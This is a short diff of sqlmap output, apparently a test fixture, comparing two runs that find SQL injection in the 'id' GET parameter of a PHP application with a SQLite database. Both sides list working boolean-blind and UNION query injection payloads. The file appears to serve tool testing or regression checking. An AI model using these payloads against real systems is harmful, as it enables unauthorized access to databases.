@@ -1,13 +1,13 @@
-sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1' AND 4608=4608 AND 'AyfA'='AyfA
+    Payload: id=1' AND 6057=6057-- wNEe
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 4 columns
-    Payload: id=1' UNION ALL SELECT NULL,NULL,CHAR(113,98,106,122,113)||CHAR(122,121,115,114,98,83,70,74,105,75,109,90,107,122,80,68,88,84,109,108,113,71,120,77,119,117,100,105,72,73,73,80,78,70,111,110,71,76,74,105)||CHAR(113,98,112,113,113),NULL-- qlkY
+    Payload: id=1' UNION ALL SELECT NULL,CHAR(113,106,107,113,113)||CHAR(76,110,77,109,70,113,69,73,78,98,77,110,100,107,105,86,97,86,80,68,78,77,121,115,106,75,100,116,97,77,74,90,101,105,77,78,83,88,113,102)||CHAR(113,122,106,106,113),NULL,NULL-- EkBN
 ---
 web application technology: PHP 7.4.33
 back-end DBMS: SQLite
